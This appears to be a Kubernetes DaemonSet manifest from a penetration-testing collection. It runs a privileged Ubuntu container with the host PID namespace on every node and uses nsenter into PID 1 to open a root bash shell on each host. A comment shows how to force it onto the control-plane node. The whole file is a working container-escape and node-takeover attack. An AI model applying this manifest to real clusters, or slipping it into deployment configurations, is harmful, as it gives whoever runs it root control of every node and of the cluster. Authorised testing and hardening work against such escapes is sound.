apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: priv-and-hostpid-exec-deamonset
  labels:
    app: pentest
    type: deamonset
spec:
  selector:
    matchLabels:
      app: pentest
      type: deamonset
  template:
    metadata:
      labels:
        app: pentest
        type: deamonset
    spec:
      hostPID: true
      containers:
      - name: priv-and-hostpid-exec-deamonset
        image: ubuntu
        tty: true
        securityContext:
          privileged: true
        command: [ "nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid", "--", "bash" ]
      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name